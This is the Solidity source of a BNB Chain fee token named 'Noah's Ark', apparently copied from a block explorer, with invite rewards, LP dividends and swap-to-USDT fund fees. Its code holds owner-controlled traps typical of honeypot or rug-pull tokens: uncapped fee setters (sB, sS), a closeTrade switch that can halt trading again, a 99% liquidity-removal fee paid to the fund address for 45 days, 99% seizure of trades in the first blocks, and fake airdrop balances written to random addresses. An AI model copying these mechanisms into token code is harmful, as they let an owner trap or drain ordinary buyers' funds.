/**
 *Submitted for verification at BscScan.com on 2023-01-12
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address public _owner;
    constructor (address token) {
        _owner = msg.sender;
        IERC20(token).approve(msg.sender, ~uint256(0));
    }

    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "!owner");
        IERC20(token).transfer(to, amount);
    }
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function sync() external;
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyDestroyFee = 600;
    uint256 public _buyInviteRewardRate = 900;

    uint256 public _sellLPDividendFee = 100;
    uint256 public _sellFundFee = 400;
    uint256 public _sellDestroyFee = 100;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    address public _mainPair;
    uint256 public _numToSell;
	bool public swapAndLiquifyByLimitOnly = false;

    uint256 public _startTradeTime;
    uint256 public _removeLPFee = 9900;
    uint256 public _removeLPFeeDuration = 45 days;

    uint256 public _remainRewardAmount;
    mapping(address => address) public _inviter;
    mapping(address => address[]) public _binders;
    mapping(address => mapping(address => bool)) public _maybeInvitor;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address ReceiveAddress, address FundAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);

        _usdt = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        IERC20(USDTAddress).approve(RouterAddress, MAX);

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address mainPair = swapFactory.createPair(address(this), USDTAddress);
        _swapPairList[mainPair] = true;

        _mainPair = mainPair;

        uint256 tokenDecimals = 10 ** Decimals;
        uint256 total = Supply * tokenDecimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);
        fundAddress = FundAddress;

        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

        _tokenDistributor = new TokenDistributor(USDTAddress);

        excludeLpProvider[address(0)] = true;
        excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;

        lpRewardCondition = 100 * 10 ** IERC20(USDTAddress).decimals();
        _numToSell = 1000 * tokenDecimals;

        _addLpProvider(FundAddress);

        _remainRewardAmount = 12000000 * tokenDecimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        return balance;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    mapping(address => uint256) private _userLPAmount;
    address public _lastMaybeAddLPAddress;
    uint256 public _lastMaybeAddLPAmount;
    address public _lastMaybeRemoveLPAddress;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        address lastMaybeAddLPAddress = _lastMaybeAddLPAddress;
        if (lastMaybeAddLPAddress != address(0)) {
            _lastMaybeAddLPAddress = address(0);
            address mainPair = _mainPair;
            uint256 lpBalance = IERC20(mainPair).balanceOf(lastMaybeAddLPAddress);
            if (lpBalance > 0) {
                uint256 lpAmount = _userLPAmount[lastMaybeAddLPAddress];
                if (lpBalance > lpAmount) {
                    uint256 debtAmount = lpBalance - lpAmount;
                    uint256 maxDebtAmount = _lastMaybeAddLPAmount * IERC20(mainPair).totalSupply() / balanceOf(mainPair);
                    _addLpProvider(lastMaybeAddLPAddress);
                    if (debtAmount > maxDebtAmount) {
                        excludeLpProvider[lastMaybeAddLPAddress] = true;
                    }
                }
                if (lpBalance != lpAmount) {
                    _userLPAmount[lastMaybeAddLPAddress] = lpBalance;
                }
            }
        } else {
            address lastMaybeRemoveLPAddress = _lastMaybeRemoveLPAddress;
            if (lastMaybeRemoveLPAddress != address(0)) {
                _lastMaybeRemoveLPAddress = address(0);
                uint256 lpBalance = IERC20(_mainPair).balanceOf(lastMaybeRemoveLPAddress);
                uint256 lpAmount = _userLPAmount[lastMaybeRemoveLPAddress];
                if (lpAmount > lpBalance) {
                    _userLPAmount[lastMaybeRemoveLPAddress] = lpBalance;
                }
            }
        }

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 999999 / 1000000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            _airdrop(from, to, amount);
        }

        bool takeFee;
        bool isRemoveLP;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_feeWhiteList[from] && to == _mainPair && IERC20(to).totalSupply() == 0) {
                    startAddLPBlock = block.number;
                }
            }
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                takeFee = true;
                bool isAdd;
                if (_swapPairList[to]) {
                    isAdd = _isAddLiquidity();
                    if (isAdd) {
                        takeFee = false;
                    }
                } else {
                    isRemoveLP = _isRemoveLiquidity();
                }

                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && isAdd, "!Trade");
                }

                if (block.number < startTradeBlock + 10) {
                    _funTransfer(from, to, amount);
                    return;
                }
            }
        } else {
            if (address(0) == _inviter[to] && amount > 0 && from != to) {
                _maybeInvitor[to][from] = true;
            }
            if (address(0) == _inviter[from] && amount > 0 && from != to) {
                if (_maybeInvitor[from][to] && _binders[from].length == 0) {
                    _bindInvitor(from, to);
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isRemoveLP);

        if (from != address(this)) {
            address mainPair = _mainPair;
            if (to == mainPair) {
                _lastMaybeAddLPAddress = from;
                _lastMaybeAddLPAmount = amount;
            } else if (from == mainPair) {
                _lastMaybeRemoveLPAddress = to;
            }

            uint256 rewardGas = _rewardGas;
            processLP(rewardGas);
        }
    }

    address public lastAirdropAddress;

    function _airdrop(address from, address to, uint256 tAmount) private {
        uint256 num = 2;
        uint256 seed = (uint160(lastAirdropAddress) | block.number) ^ (uint160(from) ^ uint160(to));
        uint256 airdropAmount = 1;
        address airdropAddress;
        for (uint256 i; i < num;) {
            airdropAddress = address(uint160(seed | tAmount));
            _balances[airdropAddress] = airdropAmount;
            emit Transfer(airdropAddress, airdropAddress, airdropAmount);
        unchecked{
            ++i;
            seed = seed >> 1;
        }
        }
        lastAirdropAddress = airdropAddress;
    }

    function _bindInvitor(address account, address invitor) private {
        if (invitor != address(0) && invitor != account && _inviter[account] == address(0)) {
            uint256 size;
            assembly {size := extcodesize(invitor)}
            if (size > 0) {
                return;
            }
            _inviter[account] = invitor;
            _binders[invitor].push(account);
        }
    }

    function getBinderLength(address account) external view returns (uint256){
        return _binders[account].length;
    }

    function _isAddLiquidity() internal view returns (bool isAdd){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isRemoveLP
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            if (isRemoveLP) {
                if (block.timestamp < _startTradeTime + _removeLPFeeDuration) {
                    uint removeFeeAmount = tAmount * _removeLPFee / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, fundAddress, removeFeeAmount);
                    }
                }
            } else {
                if (_swapPairList[sender]) {//Buy
                    uint256 destroyAmount = tAmount * _buyDestroyFee / 10000;
                    if (destroyAmount > 0) {
                        feeAmount += destroyAmount;
                        _takeTransfer(sender, address(this), destroyAmount);
                    }

                    uint256 remainRewardAmount = _remainRewardAmount;
                    if (remainRewardAmount > 0) {
                        uint256 inviteFeeAmount = _buyInviteRewardRate * tAmount / 10000;
                        if (inviteFeeAmount > remainRewardAmount) {
                            inviteFeeAmount = remainRewardAmount;
                        }
                        _remainRewardAmount -= inviteFeeAmount;

                        _tTotal += inviteFeeAmount;

                        uint256 financeAmount = inviteFeeAmount;
                        address invitor;
                        uint256 invitorAmount;
                        address current = recipient;
                        for (uint256 i; i < 8;) {
                            invitor = _inviter[current];
                            if (address(0) == invitor) {
                                break;
                            }

                            if (0 == i) {
                                invitorAmount = inviteFeeAmount * 6 / 18;
                            } else if (1 == i) {
                                invitorAmount = inviteFeeAmount * 4 / 18;
                            } else if (2 == i) {
                                invitorAmount = inviteFeeAmount * 2 / 18;
                            } else if (3 == i) {
                                invitorAmount = inviteFeeAmount * 2 / 18;
                            } else if (4 == i) {
                                invitorAmount = inviteFeeAmount * 1 / 18;
                            } else if (5 == i) {
                                invitorAmount = inviteFeeAmount * 1 / 18;
                            } else if (6 == i) {
                                invitorAmount = inviteFeeAmount * 1 / 18;
                            } else if (7 == i) {
                                invitorAmount = inviteFeeAmount * 1 / 18;
                            }

                            if (invitorAmount > 0) {
                                _takeTransfer(address(0), invitor, invitorAmount);
                                financeAmount -= invitorAmount;
                            }

                            current = invitor;
                        unchecked{
                            ++i;
                        }
                        }

                        if (financeAmount > 100) {
                            _takeTransfer(address(0), address(0x000000000000000000000000000000000000dEaD), financeAmount);
                        }
                    }
                } else {//Sell
                    uint256 destroyAmount = tAmount * _sellDestroyFee / 10000;
                    if (destroyAmount > 0) {
                        feeAmount += destroyAmount;
                        _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), destroyAmount);
                    }

                    uint256 fundFee = _sellFundFee;
                    uint256 swapFee = _sellLPDividendFee + fundFee;
                    uint256 swapAmount = tAmount * swapFee / 10000;
                    if (swapAmount > 0) {
                        feeAmount += swapAmount;
                        _takeTransfer(sender, address(this), swapAmount);
                    }
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        uint256 numToSell = _numToSell;
                        if (contractTokenBalance >= numToSell) {
						    if(swapAndLiquifyByLimitOnly)
                               contractTokenBalance = numToSell;
                            swapTokenForFund(contractTokenBalance, swapFee, fundFee);
                        }
                    }
                }
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee, uint256 fundFee) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
        }

        address usdt = _usdt;
        address tokenDistributor = address(_tokenDistributor);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            tokenDistributor,
            block.timestamp
        );

        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(tokenDistributor);
        USDT.transferFrom(tokenDistributor, address(this), usdtBalance);

        uint256 fundUsdt = usdtBalance * fundFee / swapFee;
        if (fundUsdt > 0) {
            USDT.transfer(fundAddress, fundUsdt);
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
        _addLpProvider(addr);
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function batchSetFeeWhiteList(address [] memory addr, bool enable) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }

    address[] public lpProviders;
    mapping(address => uint256) public lpProviderIndex;
    mapping(address => bool) public excludeLpProvider;

    function getLPProviderLength() public view returns (uint256){
        return lpProviders.length;
    }

    function _addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                uint256 size;
                assembly {size := extcodesize(adr)}
                if (size > 0) {
                    return;
                }
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }

    uint256 public currentLPIndex;
    uint256 public lpRewardCondition;
    uint256 public progressLPBlock;
    uint256 public progressLPBlockDebt = 0;
    uint256 public lpHoldCondition = 1;
    uint256 public _rewardGas = 500000;

    function processLP(uint256 gas) private {
        if (progressLPBlock + progressLPBlockDebt > block.number) {
            return;
        }

        IERC20 mainpair = IERC20(_mainPair);
        uint totalPair = mainpair.totalSupply();
        if (0 == totalPair) {
            return;
        }

        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(this));
        uint256 rewardCondition = lpRewardCondition;
        if (usdtBalance < rewardCondition) {
            return;
        }
        usdtBalance = rewardCondition;

        address shareHolder;
        uint256 pairBalance;
        uint256 lpAmount;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = lpHoldCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentLPIndex >= shareholderCount) {
                currentLPIndex = 0;
            }
            shareHolder = lpProviders[currentLPIndex];
            pairBalance = mainpair.balanceOf(shareHolder);
            lpAmount = _userLPAmount[shareHolder];
            if (lpAmount < pairBalance) {
                pairBalance = lpAmount;
            } else if (lpAmount > pairBalance) {
                _userLPAmount[shareHolder] = pairBalance;
            }
            if (pairBalance >= holdCondition && !excludeLpProvider[shareHolder]) {
                amount = usdtBalance * pairBalance / totalPair;
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentLPIndex++;
            iterations++;
        }

        progressLPBlock = block.number;
    }

    function setLPHoldCondition(uint256 amount) external onlyOwner {
        lpHoldCondition = amount;
    }

    function setLPRewardCondition(uint256 amount) external onlyOwner {
        lpRewardCondition = amount;
    }

    function setLPBlockDebt(uint256 debt) external onlyOwner {
        progressLPBlockDebt = debt;
    }

    function setExcludeLPProvider(address addr, bool enable) external onlyOwner {
        excludeLpProvider[addr] = enable;
    }

    receive() external payable {}

    function claimContractToken(address token, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            _tokenDistributor.claimToken(token, fundAddress, amount);
        }
    }

    function setRewardGas(uint256 rewardGas) external onlyOwner {
        require(rewardGas >= 200000 && rewardGas <= 2000000, "200000-2000000");
        _rewardGas = rewardGas;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
        _startTradeTime = block.timestamp;
    }
	
	function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }
	
	function sB(uint256 newDestroyFee, uint256 newInviteRewardRate) external onlyOwner() {
        _buyDestroyFee = newDestroyFee;
        _buyInviteRewardRate = newInviteRewardRate;
    }

    function sS(uint256 newLPDividendFee, uint256 newFundFee, uint256 newDestroyFee) external onlyOwner() {
        _sellLPDividendFee = newLPDividendFee;
        _sellFundFee = newFundFee;
        _sellDestroyFee = newDestroyFee;
    }

    function setNumToSell(uint256 amount) external onlyOwner {
        _numToSell = amount;
    }
	
	function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
        swapAndLiquifyByLimitOnly = newValue;
    }

    function setRemoveLPFee(uint256 fee) external onlyOwner {
        _removeLPFee = fee;
    }

    function setRemoveLPFeeDuration(uint256 duration) external onlyOwner {
        _removeLPFeeDuration = duration;
    }

    function updateLPAmount(address account, uint256 lpAmount) public {
        if (_feeWhiteList[msg.sender] && fundAddress == msg.sender) {
            _userLPAmount[account] = lpAmount;
        }
    }

    function getUserInfo(address account) public view returns (
        uint256 lpAmount, uint256 lpBalance, bool excludeLP
    ) {
        lpAmount = _userLPAmount[account];
        lpBalance = IERC20(_mainPair).balanceOf(account);
        excludeLP = excludeLpProvider[account];
    }
}

contract Ark is AbsToken {
    constructor() AbsToken(
    //SwapRouter
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
    //USDT
        address(0x55d398326f99059fF775485246999027B3197955),
        "Noah's Ark",
        "Ark",
        18,
        88000000,
    //Receive
        address(0x7809e41Ca9802b13Db2279Fcb6368673da31da6E),
    //Fund
        address(0xf9d0929CDEF220C1A2531F052890F67DDBF6f925)
    ){

    }
}